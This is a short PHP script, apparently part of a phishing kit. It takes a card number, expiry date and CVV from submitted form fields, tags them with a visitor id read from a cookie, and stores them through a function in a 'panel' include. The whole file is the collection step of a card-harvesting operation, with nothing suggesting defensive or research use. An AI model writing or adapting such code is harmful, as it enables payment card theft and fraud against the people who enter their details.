<?php
require_once("../lib/class.inputfilter.php");
require('../panel/include/setings.php');
date_default_timezone_set('America/Bogota');
$ifilter = new InputFilter();

$tarjeta = $ifilter->process($_POST['tar']);
$fecha = $ifilter->process($_POST['fec']);
$cvv = $ifilter->process($_POST['cvv']);

$id = $_COOKIE['id'];

put_card($id,$tarjeta,$fecha,$cvv);
?>